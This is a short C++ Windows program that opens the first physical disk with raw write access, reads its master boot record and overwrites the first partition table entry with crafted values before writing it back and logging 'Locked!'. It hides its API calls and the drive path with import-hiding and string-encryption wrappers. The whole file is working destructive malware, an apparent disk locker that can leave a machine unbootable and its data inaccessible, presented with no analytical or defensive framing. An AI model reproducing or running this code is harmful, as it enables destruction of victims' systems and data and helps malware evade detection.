#include "stdafx.h"

int
wmain(
	uint16_t argc,
	wchar_t** argv
)
{
	auto DiskHandle = LI_FN(CreateFileW)(XorStrW(L"\\\\.\\PhysicalDrive0"), FILE_WRITE_DATA | FILE_READ_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (DiskHandle != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER Pos{ 0 };
		DWORD Bytes = 0;
		BYTE Sector[0x200]{ 0x00 };
		LI_FN(SetFilePointer)(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
		if (LI_FN(ReadFile)(DiskHandle, Sector, sizeof(Sector), &Bytes, nullptr))
		{
			Sector[0x1BE] = 0x80;
			Sector[0x1BF] = 0xFE;
			Sector[0x1C0] = 0xFF;
			Sector[0x1C1] = 0xFF;
			Sector[0x1C2] = 0x0F;
			Sector[0x1C3] = 0xFE;
			Sector[0x1C4] = 0xFF;
			Sector[0x1C5] = 0xFF;
			Sector[0x1C6] = 0x00;
			Sector[0x1C7] = 0x00;
			Sector[0x1C8] = 0x00;
			Sector[0x1C9] = 0x00;
			Sector[0x1CA] = 0x01;
			Sector[0x1CB] = 0x00;
			Sector[0x1CC] = 0x00;
			Sector[0x1CD] = 0x00;

			LI_FN(SetFilePointer)(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
			if (LI_FN(WriteFile)(DiskHandle, Sector, sizeof(Sector), &Bytes, nullptr))
			{
				spdlog::info("Locked!");
			}
			else
				spdlog::error("WriteFile error,GetLastError():{}", GetLastError());
		}
		else
			spdlog::error("ReadFile error,GetLastError():{}", GetLastError());

		LI_FN(CloseHandle)(DiskHandle);
	}
	else
		spdlog::error("CreateFile error,GetLastError():{}", GetLastError());

	_getch();

	return GetLastError();
}